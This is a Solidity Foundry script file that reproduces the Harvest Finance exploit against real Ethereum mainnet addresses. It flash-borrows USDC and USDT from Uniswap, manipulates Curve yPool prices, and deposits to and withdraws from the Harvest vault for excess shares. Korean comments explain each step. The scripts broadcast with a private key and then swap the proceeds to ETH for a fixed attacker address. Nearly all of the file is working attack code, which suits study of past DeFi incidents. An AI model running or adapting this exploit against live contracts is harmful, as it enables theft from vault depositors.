// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./interface.sol";

import "forge-std/Script.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface HVault {
    function deposit(uint256) external;
    function balanceOf(address) external returns (uint256);
    function withdraw(uint256) external;
}

interface YCurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface CurveStrategy {
    function deposit(uint256) external;
    function withdraw(uint256) external;
}

contract Withd is Script {
    uint256 secret = vm.envUint("PRIVATE_KEY");
    address immutable attacker = vm.rememberKey(secret);

    // 6 decimals on usdt
    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH constant weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair constant usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair constant usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);

    function setUp() external {
        vm.label(address(this), "attacker");
        require(attacker == address(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14), "Attacker address is incorrect");
    }

    function run() external {
        vm.startBroadcast(secret);

        console.log("attacker balance: %d %d", attacker.balance / 1e18, attacker.balance % 1e18);
        console.log("USDC balance: %d", usdc.balanceOf(attacker));
        console.log("USDT balance: %d", usdt.balanceOf(attacker));

        IUniswapV2Router router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uint256 amountIn = usdt.balanceOf(attacker);
        usdt.approve(address(router), 0);
        usdt.approve(address(router), amountIn);
        address[] memory path = new address[](2);
        path[0] = address(usdt);
        path[1] = address(weth);
        router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);

        amountIn = usdc.balanceOf(attacker);
        usdc.approve(address(router), amountIn);
        path[0] = address(usdc);
        router.swapExactTokensForETH(amountIn, 1 ether, path, attacker, type(uint256).max);

        console.log("WETH balance: %d", weth.balanceOf(attacker));
        weth.withdraw(weth.balanceOf(attacker));
        console.log("attacker balance: %d %d", attacker.balance / 1e18, attacker.balance % 1e18);

        vm.stopBroadcast();
    }
}

contract Rw2 is Script {
    uint256 secret = vm.envUint("PRIVATE_KEY");
    address immutable attacker = vm.rememberKey(secret);

    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair constant usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // Uniswap ETH/USDT LP (UNI-V2)
    IUniswapV2Pair constant usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    // 6 decimals on usdt
    IERC20 constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    WETH constant weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Exploit ex;

    function setUp() external {
        vm.label(address(this), "attacker");
        vm.label(address(usdcPair), "usdcPair");
        vm.label(address(usdtPair), "usdtPair");
        vm.label(address(usdt), "usdt");
        vm.label(address(usdc), "usdc");
        require(attacker == address(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14), "Attacker address is incorrect");
    }

    function run() external {
        vm.startBroadcast(secret);
        vm.startStateDiffRecording();

        ex = new Exploit();
        vm.label(address(ex), "exploiter");

        consoleStatus();

        for (uint256 i = 0; i < 1; ++i) {
            ex.run();
        }
        require(usdc.balanceOf(attacker) > 0 || usdt.balanceOf(attacker) > 0, "Not enough funds");

        consoleStatus();

        console.log(usdcPair.balanceOf(attacker));
        console.log(usdtPair.balanceOf(attacker));

        // Approve USDC and USDT for swapping

        // Swap all USDC for WETH
        // usdcPair.swap(100 ether, 0, msg.sender, new bytes(0));

        // Swap all USDT for WETH
        // usdt.approve(address(usdtPair), usdt.balanceOf(attacker));
        // usdtPair.swap(0, 123 * 1e6, msg.sender, new bytes(0));

        // Withdraw WETH to ETH

        // Log the attacker's ETH balance
        console.log("attacker balance: %d %d", attacker.balance / 1e18, attacker.balance % 1e18);

        // Stop the script and return the state diff

        // Vm.AccountAccess[] memory records = vm.stopAndReturnStateDiff();
        // console.log("State diff: %d", records.length);

        vm.stopBroadcast();
    }

    function consoleStatus() internal view {
        // console.log(attacker); // 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14
        console.log("Attacker balance: ", attacker.balance);
        console.log("USDC balance: ", usdc.balanceOf(attacker));
        console.log("USDT balance: ", usdt.balanceOf(attacker));
        console.log("WETH balance: ", weth.balanceOf(attacker));

        // (uint256 reserve0, uint256 reserve1,) = usdcPair.getReserves();
        // console.log("%s (reserve0): %d ", ERC20(usdcPair.token0()).name(), reserve0);
        // console.log("%s (reserve1): %d ", ERC20(usdcPair.token1()).name(), reserve1);

        // (reserve0, reserve1,) = usdtPair.getReserves();
        // console.log("%s (reserve0): %d ", ERC20(usdtPair.token0()).name(), reserve0);
        // console.log("%s (reserve1): %d ", ERC20(usdtPair.token1()).name(), reserve1);
    }
}

// Harvest Finance는 Curve를 stable coin의 price oracle로 사용
// 0. Flash borrow 50M USDT and 10M USDC
// 1. Swap 10M USDC to USDT
// 2. Deposit 50M USDT & Receive 52M yUSDT
// 1. USDC를 USDT로 Swap (Curve에서 USDT의 가격 상승)
// 2. Harvest Finance에 Deposit (조작된 USDT 가격 기준으로 vault share 지급)
// 3. USDT를 USDC로 Swap (Curve에서 USDT의 가격 하락, 시세 조작에 든 비용 대부분 회수)
// 4. Harvest Finance에서 Withdraw
// (vault share를 비정상적으로 많이 받았기 때문에 더 많은 USDT를 받아서 이득)
// 5. 반복
// Arbitrage check 기능에서 이전 가격과 차이가 3% 이상인지 확인했지만 그래도 공격 가능

contract Exploit is IUniswapV2Callee {
    address constant attacker = address(0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14);
    // CONTRACTS
    // Uniswap ETH/USDC LP (UNI-V2)
    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc); //uni-USDC
    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); //uni-USDT
    // Curve y swap
    IcurveYSwap curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51); // yCurve
    // Harvest USDC pool
    IHarvestVault harvest = IHarvestVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
    // IHarvestVault harvest = IHarvestVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);

    // h = HVault(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // ● c = CurveStrategy(0x1C47343eA7135c2bA3B2d24202AD960aDaFAa81c);
    // ● y = yCurve(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    // ● uUSDT = UniSwapV2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    // ● uUSDC = UniSwapV2(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    // ● usdt = ERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // ● usdc = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // ERC20s
    // 6 decimals on usdt
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    // 6 decimals on usdc
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // 6 decimals on yusdc
    IERC20 yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
    // 6 decimals on yusdt
    IERC20 yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
    // 6 decimals on fUSDT
    IERC20 fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
    // 6 decimals on fUSDC
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    // uint256 usdcLoan = 10_000_000 * 10 ** 6;
    uint256 usdcLoan = 39_000_000 * 10 ** 6;
    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000;

    // uint256 usdtLoan = 50_000_000 * 10 ** 6;
    uint256 usdtLoan = 10_000_000 * 10 ** 6;
    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;

    event log_named_uint(string name, uint256 value);

    function run() external {
        // usdt.approve(address(curveYSwap), 0);
        // usdt.approve(address(harvest), 0);
        // usdt.approve(address(usdtPair), 0);

        // usdt.approve(address(curveYSwap), type(uint256).max);
        // usdt.approve(address(harvest), type(uint256).max);

        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);

        testExploit();
        // (bool res,) = attacker.call{value: address(this).balance}("");
        usdt.transfer(attacker, usdt.balanceOf(address(this)));
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }

    function testExploit() public {
        // console.log(address(this)); // 0x135bA7F14dB39f76e53F463F753472F4a029a6E7

        // emit log_named_uint("Before exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        // emit log_named_uint("Before exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);

        // usdt.approve(address(usdtPair), 0);
        // console.log(usdt.name());
        // console.log(usdt.allowance(address(this), address(usdtPair)));
        usdcPair.swap(usdcLoan, 0, address(this), "0x1234");

        emit log_named_uint("After exploitation, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        emit log_named_uint("After exploitation, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            // emit log_named_uint("Flashloan, Amount of USDC received:", usdc.balanceOf(address(this)) / 1e6);

            usdtPair.swap(0, usdtLoan, address(this), "0x1234");
            usdc.transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            // emit log_named_uint("Flashloan, Amount of USDT received:", usdt.balanceOf(address(this)) / 1e6);
            // for (uint256 i = 0; i < 4; i++) {

            for (uint256 i = 0; i < 1; i++) {
                theSwap_2(i);
            }
            usdt.transfer(address(usdtPair), usdtRepayment);
        }
    }

    function theSwap_2(uint256 i) internal {
        {
            uint256 amount = usdtLoan * 100_300 / 100_000;
            usdt.approve(address(curveYSwap), amount);
            curveYSwap.exchange_underlying(2, 1, amount, 0); // USDT -> USDC which increases the price of USDC
        }
        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
        console.log("%d %d", usdcRepayment, usdtRepayment);

        require(address(harvest) == 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
        harvest.deposit(usdcLoan);

        curveYSwap.exchange_underlying(1, 2, usdtLoan, 0);

        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
        console.log("%d %d", usdcRepayment, usdtRepayment);

        harvest.withdraw(fusdc.balanceOf(address(this)));

        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
        console.log("%d %d", usdcRepayment, usdtRepayment);

        // curveYSwap.exchange_underlying(2, 1, (usdcRepayment - usdcLoan) * 103 / 100, 0);

        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
        console.log("%d %d", usdcRepayment, usdtRepayment);

        // emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        // emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
    }

    function theSwap(uint256 i) internal {
        curveYSwap.exchange_underlying(1, 2, usdcLoan, 0); // USDC -> USDT which increases the price of USDT
        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));

        usdt.approve(address(harvest), usdtLoan);
        harvest.deposit(usdtLoan);
        // emit log_named_uint("After deposit, fUSDT balance of attacker:", fusdt.balanceOf(address(this)));
        {
            uint256 amount = usdcLoan * 100_300 / 100_000;
            usdt.approve(address(curveYSwap), amount);
            curveYSwap.exchange_underlying(2, 1, amount, 0);
        }

        harvest.withdraw(fusdt.balanceOf(address(this)));

        // curveYSwap.exchange_underlying(2, 1, (usdcRepayment - usdcLoan) * 103 / 100, 0);

        console.log("%d %d", usdc.balanceOf(address(this)), usdt.balanceOf(address(this)));
        console.log("%d %d", fusdc.balanceOf(address(this)), fusdt.balanceOf(address(this)));
        console.log("%d %d", usdcRepayment, usdtRepayment);

        // emit log_named_uint("After swap, USDC balance of attacker:", usdc.balanceOf(address(this)) / 1e6);
        // emit log_named_uint("After swap, USDT balance of attacker:", usdt.balanceOf(address(this)) / 1e6);
    }

    receive() external payable {}
}
